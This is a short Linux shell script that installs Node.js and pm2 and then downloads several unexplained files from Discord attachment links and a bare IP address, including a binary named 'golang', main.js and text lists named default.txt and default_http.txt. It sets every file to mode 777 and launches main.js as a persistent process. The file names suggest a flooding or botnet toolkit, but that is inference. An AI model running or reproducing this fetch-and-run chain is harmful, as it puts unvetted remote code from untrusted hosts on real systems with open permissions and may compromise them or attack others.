apt install curl -y
curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
sudo apt install nodejs -y
sudo npm i -g pm2 
wget https://cdn.discordapp.com/attachments/768989398002827288/932375202707415100/golang.js
wget http://179.43.176.37:8080/public/files165/golang
wget https://cdn.discordapp.com/attachments/922613085200613376/927114273786826752/test.sh
wget https://cdn.discordapp.com/attachments/768989398002827288/933554114393157672/main.js
wget http://179.43.176.37:8080/public/default.txt
wget http://179.43.176.37:8080/public/default_http.txt
sudo apt-get install dvtm dtach
chmod 777 *
pm2 start main.js
